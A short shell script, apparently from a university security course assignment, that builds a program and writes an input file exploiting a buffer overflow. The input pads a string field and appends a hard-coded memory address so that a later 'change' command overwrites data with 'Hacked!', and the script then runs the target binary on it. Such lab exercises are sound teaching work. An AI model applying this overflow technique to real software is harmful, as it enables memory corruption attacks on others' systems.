# This script creates the part1 file used to execute the first part.
make
echo -e "add 1 string test 0000000000000000000000000000000000\x50\x85\x04\x08" > part1
echo -e "change 1 Hacked! test" >> part1
./cs165-p3 part1 output